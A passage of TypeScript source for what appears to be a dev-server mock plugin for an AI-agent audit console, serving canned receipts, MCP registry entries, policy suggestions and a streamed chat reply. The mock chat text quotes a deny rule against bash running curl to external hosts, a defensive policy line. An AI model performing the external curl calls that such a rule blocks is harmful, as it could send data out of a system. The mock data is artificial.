    const subject =
      (r.signed_predicate.principal as { subject?: string }).subject ?? "(unknown)";
    const arr = byPrincipal.get(subject) ?? [];
    arr.push(r);
    byPrincipal.set(subject, arr);
  }
  const lanes = Array.from(byPrincipal.entries()).map(([subject, events]) => ({
    principal: { subject, kind: events[0]?.signed_predicate.principal },
    events: events.map((r) => ({
      run_id: r.run_id,
      timestamp: r.signed_predicate.timestamp,
      tags: r.outer_container.tags,
      policy_decision: r.outer_container.policy_decision,
      verification_level: r.outer_container.verification_level,
      session_id: r.signed_predicate.session_id,
      correlation_id: r.signed_predicate.correlation_id,
    })),
  }));

  return {
    density,
    lanes,
    active_scope: {
      principal,
      session_id: sessionId,
      correlation_id: correlationId,
      time_window: {
        since: query.get("since") ?? null,
        until: query.get("until") ?? null,
      },
    },
  };
}

function buildRelatedResponse(targetRunId: string): unknown {
  const target = MOCK_RECEIPTS.find((r) => r.run_id === targetRunId);
  if (!target) return { receipts: [] };
  const tCorr = target.signed_predicate.correlation_id;
  const tSess = target.signed_predicate.session_id;
  const tSubj =
    (target.signed_predicate.principal as { subject?: string }).subject ?? "";
  const tMs = Date.parse(target.signed_predicate.timestamp ?? "");

  const receipts = MOCK_RECEIPTS.filter((r) => r.run_id !== targetRunId)
    .map((r) => {
      const sp = r.signed_predicate;
      const subj = (sp.principal as { subject?: string }).subject ?? "";
      const ms = Date.parse(sp.timestamp ?? "");
      let relation: string | null = null;
      if (tCorr && sp.correlation_id === tCorr) relation = "same_correlation";
      else if (
        tSess &&
        sp.session_id === tSess &&
        Math.abs(ms - tMs) <= SESSION_ADJACENT_WINDOW_MS
      )
        relation = "session_adjacent";
      else if (
        subj === tSubj &&
        Math.abs(ms - tMs) <= PRINCIPAL_ADJACENT_WINDOW_MS
      )
        relation = "principal_adjacent";
      if (!relation) return null;
      return {
        run_id: r.run_id,
        timestamp: sp.timestamp,
        event_kind: sp.event_kind,
        display_summary: r.outer_container.tags?.display_summary,
        policy_decision: r.outer_container.policy_decision,
        relation,
      };
    })
    .filter((x): x is NonNullable<typeof x> => x !== null);
  return { receipts };
}

// ---------------------------------------------------------------------------
// Plugin
// ---------------------------------------------------------------------------

export function devMocksPlugin(): Plugin {
  // Mutable in-memory copy so PATCH operations survive across requests
  // within the dev-server lifetime.
  const registry = seedRegistry.map((e) => ({ ...e }));

  return {
    name: "r5e-dev-mocks",
    apply: "serve",
    configureServer(server) {
      server.middlewares.use(async (req, res, next) => {
        const url = req.url ?? "";
        const method = (req.method ?? "GET").toUpperCase();
        const log = (label: string) => console.log(`[dev-mocks] ${label} ${method} ${url}`);

        // --- Auth ---
        if (url.startsWith("/v1/auth/me")) {
          log("auth/me");
          return jsonResponse(res, 200, MOCK_USER);
        }

        // Login redirect — when the SPA tries to redirect to login, just say
        // "you're already logged in" (return a 204 so the SPA doesn't navigate)
        if (url.startsWith("/admin/login/start") || url.startsWith("/admin/logout")) {
          log("login-noop");
          res.statusCode = 204;
          res.end();
          return;
        }

        // --- F10 Timeline (!94) — must precede receipt-detail matcher
        //     since `/v1/audit/receipts/:run_id/related` would otherwise
        //     get captured as a receipt detail. ---
        const timelineMatch = url.match(/^\/v1\/audit\/timeline(\?.*)?$/);
        if (timelineMatch) {
          log("audit-timeline");
          const query = new URLSearchParams(timelineMatch[1]?.slice(1) ?? "");
          return jsonResponse(res, 200, buildTimelineResponse(query));
        }
        const relatedMatch = url.match(/^\/v1\/audit\/receipts\/([^/?]+)\/related/);
        if (relatedMatch) {
          log(`audit-related ${relatedMatch[1]}`);
          return jsonResponse(res, 200, buildRelatedResponse(relatedMatch[1] ?? ""));
        }

        // --- Audit receipts (!86) ---
        if (url.startsWith("/v1/audit/receipts") && !url.match(/\/v1\/audit\/receipts\/[^?]+/)) {
          log("receipts-list");
          // Build facet counts from the mock data
          const event_kind: Record<string, number> = {};
          const policy_decision: Record<string, number> = {};
          const verification_level: Record<string, number> = {};
          for (const r of MOCK_RECEIPTS) {
            const k = r.signed_predicate.event_kind;
            event_kind[k] = (event_kind[k] ?? 0) + 1;
            const d = r.outer_container.policy_decision;
            if (d) policy_decision[d] = (policy_decision[d] ?? 0) + 1;
            const v = r.outer_container.verification_level;
            if (v) verification_level[v] = (verification_level[v] ?? 0) + 1;
          }
          return jsonResponse(res, 200, {
            receipts: MOCK_RECEIPTS,
            cursor: null,
            facets: { event_kind, policy_decision, verification_level },
          });
        }

        const receiptDetailMatch = url.match(/^\/v1\/audit\/receipts\/([^/?]+)/);
        if (receiptDetailMatch) {
          log(`receipts-detail ${receiptDetailMatch[1]}`);
          const id = receiptDetailMatch[1] ?? "";
          const found = MOCK_RECEIPTS.find((r) => r.run_id === id);
          if (found) return jsonResponse(res, 200, found);
          // GAN MR !96 finding (codex_cli): silently returning
          // MOCK_RECEIPTS[0] for unknown IDs masked broken deep links.
          // Chat-SSE tool-call links + suggestion triggered_by_ids
          // reference UUID-shaped IDs that aren't in MOCK_RECEIPTS; for
          // those we synthesize a deterministic stub receipt so the
          // demo's cross-surface links still resolve. For non-UUID
          // unknown IDs we return 404 so genuine breakage surfaces.
          const isReferenceShaped = /^[0-9a-f-]{8,}$/i.test(id);
          if (isReferenceShaped) {
            const stub = mkReceipt({
              off: 0,
              category: "tool_call",
              display_summary: `Synthesized receipt for ${id}`,
              tool_kind: "bash",
              verb: "echo",
              argument_body: id,
              run_id: id,
            });
            return jsonResponse(res, 200, stub);
          }
          return jsonResponse(res, 404, {
            error: "not_found",
            error_description: `receipt ${id} not found`,
            correlation_id: "dev-mocks",
            attested_run_id: null,
          });
        }

        // --- MCP registry (!88) ---
        if (url === "/v1/mcp/registry" && method === "GET") {
          log("mcp-registry-list");
          return jsonResponse(res, 200, {
            version: "1.0.0",
            generated_at: new Date().toISOString(),
            description: "Dev-mocks fixture catalog",
            entries: registry,
          });
        }

        const mcpDetailMatch = url.match(/^\/v1\/mcp\/registry\/([^/?#]+)/);
        if (mcpDetailMatch) {
          const id = decodeURIComponent(mcpDetailMatch[1]);
          const idx = registry.findIndex((e) => e.id === id);
          if (idx === -1) {
            return jsonResponse(res, 404, {
              error: "not_found",
              error_description: `MCP entry ${id} not found`,
              correlation_id: "dev-mocks",
              attested_run_id: null,
            });
          }
          if (method === "GET") {
            log(`mcp-registry-detail ${id}`);
            return jsonResponse(res, 200, registry[idx]);
          }
          if (method === "PATCH") {
            log(`mcp-registry-patch ${id}`);
            const raw = await readBody(req);
            // Visual-verification hook: an entry id starting with
            // `error-` always 500s without mutating state. Use this to
            // exercise the inline-dialog-error path.
            if (id.startsWith("error-")) {
              return jsonResponse(res, 500, {
                error: "internal_error",
                error_description:
                  "ledger commit failed (dev-mocks injected error)",
                correlation_id: "dev-mocks",
                attested_run_id: null,
              });
            }
            try {
              const patch = JSON.parse(raw || "{}") as Partial<RegistryEntry>;
              if (patch.trust_tier) {
                registry[idx] = { ...registry[idx], trust_tier: patch.trust_tier };
              }
              return jsonResponse(res, 200, registry[idx]);
            } catch (err) {
              return jsonResponse(res, 400, {
                error: "bad_request",
                error_description: `bad patch body: ${String(err)}`,
                correlation_id: "dev-mocks",
                attested_run_id: null,
              });
            }
          }
        }

        // --- Policy suggestions (!92) ---
        // GET /v1/policy/suggestions?status=...
        const sugPath = url.split("?")[0] ?? "";
        if (sugPath === "/v1/policy/suggestions" && method === "GET") {
          log("policy-suggestions-list");
          const query = new URLSearchParams(url.split("?")[1] ?? "");
          const status = query.get("status") ?? "active";
          const map: Record<string, PolicySuggestion[]> = {
            active: ACTIVE_SUGGESTIONS,
            adopted_as_draft: ADOPTED_SUGGESTIONS,
            dismissed: DISMISSED_SUGGESTIONS,
          };
          const suggestions = map[status] ?? [];
          return jsonResponse(res, 200, { suggestions, next_cursor: null });
        }

        // POST /v1/policy/suggestions/refresh — match BEFORE /:id detail
        if (method === "POST" && sugPath === "/v1/policy/suggestions/refresh") {
          log("policy-suggestions-refresh");
          await readBody(req).catch(() => "");
          return jsonResponse(res, 202, {
            run_id: `run-${Date.now()}`,
            sources_triggered: ["heuristic", "llm"],
          });
        }

        // POST /v1/policy/suggestions/:id/adopt
        const adoptMatch = /^\/v1\/policy\/suggestions\/([^/]+)\/adopt$/.exec(sugPath);
        if (method === "POST" && adoptMatch) {
          log(`policy-suggestions-adopt ${adoptMatch[1]}`);
          const id = decodeURIComponent(adoptMatch[1] ?? "");
          await readBody(req).catch(() => "");
          const draftId = `draft-${Date.now()}`;
          const all = [
            ...ACTIVE_SUGGESTIONS,
            ...ADOPTED_SUGGESTIONS,
            ...DISMISSED_SUGGESTIONS,
          ];
          const found = all.find((s) => s.id === id);
          if (found) {
            ADOPTED_DRAFTS_BY_ID.set(draftId, {
              id: draftId,
              cedar_source: found.proposed_cedar,
            });
          }
          return jsonResponse(res, 200, {
            suggestion_id: id,
            draft_id: draftId,
          });
        }

        // POST /v1/policy/suggestions/:id/dismiss
        const dismissMatch = /^\/v1\/policy\/suggestions\/([^/]+)\/dismiss$/.exec(sugPath);
        if (method === "POST" && dismissMatch) {
          log(`policy-suggestions-dismiss ${dismissMatch[1]}`);
          await readBody(req).catch(() => "");
          res.statusCode = 204;
          res.end();
          return;
        }

        // GET /v1/policy/suggestions/:id
        const sugDetailMatch = /^\/v1\/policy\/suggestions\/([^/]+)$/.exec(sugPath);
        if (method === "GET" && sugDetailMatch) {
          log(`policy-suggestions-detail ${sugDetailMatch[1]}`);
          const id = decodeURIComponent(sugDetailMatch[1] ?? "");
          const all = [
            ...ACTIVE_SUGGESTIONS,
            ...ADOPTED_SUGGESTIONS,
            ...DISMISSED_SUGGESTIONS,
          ];
          const found = all.find((s) => s.id === id);
          if (found) return jsonResponse(res, 200, found);
          return jsonResponse(res, 404, {
            error: "not_found",
            error_description: `policy suggestion ${id} not found`,
          });
        }

        // GET /v1/policy/drafts/:id — adopted-draft fetch (only entries
        // minted by the adopt mock above; everything else 404s).
        const draftMatch = /^\/v1\/policy\/drafts\/([^/]+)$/.exec(sugPath);
        if (method === "GET" && draftMatch) {
          log(`policy-drafts-detail ${draftMatch[1]}`);
          const id = decodeURIComponent(draftMatch[1] ?? "");
          const draft = ADOPTED_DRAFTS_BY_ID.get(id);
          if (draft) {
            const nowIso = new Date().toISOString();
            return jsonResponse(res, 200, {
              id: draft.id,
              tenant_id: TENANT_ID,
              author_principal_subject: PRINCIPAL,
              source_receipt_run_id: null,
              cedar_source: draft.cedar_source,
              scope_metadata: null,
              condition_metadata: null,
              status: "draft",
              created_at: nowIso,
              updated_at: nowIso,
              last_blast_radius_summary: null,
            });
          }
          return jsonResponse(res, 404, {
            error: "not_found",
            error_description: `policy draft ${id} not found`,
          });
        }

        // --- Chat (!93) ---
        // GET /v1/chat/conversations — list (envelope-shaped per
        // specs/004-audit-console/contracts/audit_api_extensions.md).
        if (url === "/v1/chat/conversations" && method === "GET") {
          log("chat-conversations-list");
          return jsonResponse(res, 200, {
            conversations: MOCK_CONVERSATIONS.filter((c) => !c.deleted).map(
              (c) => ({
                id: c.id,
                started_at: c.started_at,
                last_message_at: c.last_message_at,
                last_user_message_excerpt: c.last_user_message_excerpt,
              }),
            ),
            next_cursor: null,
          });
        }

        // GET /v1/chat/conversations/:id — single conversation history.
        const convDetailMatch = url.match(/^\/v1\/chat\/conversations\/([^/?]+)/);
        if (convDetailMatch && method === "GET") {
          log(`chat-conversations-detail ${convDetailMatch[1]}`);
          const id = decodeURIComponent(convDetailMatch[1] ?? "");
          const c = findConversation(id);
          if (!c) {
            return jsonResponse(res, 404, {
              error: "not_found",
              error_description: "Conversation not found",
              correlation_id: "dev-mock",
            });
          }
          return jsonResponse(res, 200, {
            id: c.id,
            started_at: c.started_at,
            messages: c.messages,
          });
        }

        // POST /v1/chat/messages — SSE streaming send-message endpoint.
        // Magic-word "fail" in the user prompt triggers the error path
        // (tool_call_start followed by `event: error` with no matching
        // tool_call_result) — exercises the F004 wire-contract.
        if (url === "/v1/chat/messages" && method === "POST") {
          log("chat-messages-send");
          const raw = await readBody(req).catch(() => "");
          let body: { conversation_id?: string | null; content?: string } = {};
          try {
            body = raw ? JSON.parse(raw) : {};
          } catch {
            body = {};
          }
          const convId = body.conversation_id ?? `conv-${Date.now()}`;
          const messageId = `msg-${Date.now()}`;

          res.statusCode = 200;
          res.setHeader("Content-Type", "text/event-stream");
          res.setHeader("Cache-Control", "no-cache");
          res.setHeader("Connection", "keep-alive");
          res.flushHeaders?.();

          // Honor client aborts (the F5 Stop button fires AbortController →
          // closes the request). Without this the canned event sequence
          // keeps emitting until completion, which makes the dev-mock
          // useless for verifying Stop UX end-to-end.
          let aborted = false;
          req.on("close", () => {
            aborted = true;
          });
          const sleep = (ms: number) =>
            new Promise<void>((resolve) => setTimeout(resolve, ms));

          emitSse(res, "conversation_id", { conversation_id: convId });

          const wantsErrorPath =
            typeof body.content === "string" &&
            /\bfail\b/i.test(body.content);

          if (wantsErrorPath) {
            await sleep(250);
            if (aborted) return;
            emitSse(res, "tool_call_start", {
              tool_name: "query_receipts",
              args: { decision: "deny", limit: 5 },
              attested_run_id: "ee111111-1111-1111-1111-111111111111",
            });
            await sleep(700);
            if (aborted) return;
            emitSse(res, "error", {
              error: "ERR_UPSTREAM_UNAVAILABLE",
              error_description:
                "Receipt store timed out after 30s — try again",
              correlation_id: "dev-mock-error",
            });
            res.end();
            return;
          }

          // Streaming agent tokens (3 chunks).
          const tokens = [
            "Looking at the most recent denial",
            " for that principal,\n",
            "I found one matching event.",
          ];
          for (const tok of tokens) {
            await sleep(250);
            if (aborted) return;
            emitSse(res, "agent_token", { delta: tok });
          }

          // Tool call: query_receipts (running → success).
          await sleep(350);
          if (aborted) return;
          emitSse(res, "tool_call_start", {
            tool_name: "query_receipts",
            args: { decision: "deny", limit: 5 },
            attested_run_id: "11111111-1111-1111-1111-111111111111",
          });
          await sleep(700);
          if (aborted) return;
          emitSse(res, "tool_call_result", {
            tool_name: "query_receipts",
            result: {
              count: 5,
              receipts: [{ run_id: "abc12345-2222-3333-4444-555555555555" }],
            },
            attested_run_id: "11111111-1111-1111-1111-111111111111",
          });

          // Tool call: verify_receipt (running → success).
          await sleep(250);
          if (aborted) return;
          emitSse(res, "tool_call_start", {
            tool_name: "verify_receipt",
            args: { run_id: "abc12345-2222-3333-4444-555555555555" },
            attested_run_id: "22222222-2222-2222-2222-222222222222",
          });
          await sleep(700);
          if (aborted) return;
          emitSse(res, "tool_call_result", {
            tool_name: "verify_receipt",
            result: {
              valid: true,
              checks_passed: 5,
              checks: [
                "signature",
                "payload_hash",
                "policy_canonical_hash",
                "local_inclusion",
                "global_inclusion",
              ],
            },
            attested_run_id: "22222222-2222-2222-2222-222222222222",
          });

          // Closing tokens.
          const closing = [
            "\n\nBased on those, the deny was triggered by the\n",
            '"forbid bash where verb in [curl] when host is external" rule.',
          ];
          for (const tok of closing) {
            await sleep(200);
            if (aborted) return;
            emitSse(res, "agent_token", { delta: tok });
          }

          await sleep(200);
          if (aborted) return;
          emitSse(res, "message_complete", {
            message_id: messageId,
            attested_run_id: "33333333-3333-3333-3333-333333333333",
          });

          res.end();
          return;
        }

        // --- Well-known manifest (!86) ---
        if (url.startsWith("/.well-known/r5e-audit.json")) {
          log("manifest");
          return jsonResponse(res, 200, {
            tenant_id: TENANT_ID,
            ledger_provider: "postgres-merkle",
            event_kinds: ["tool_call", "llm_call", "ui_login", "ui_session", "ui_query", "policy_denied"],
            schema_version: "1.0",
          });
        }

        next();
      });
    },
  };
}
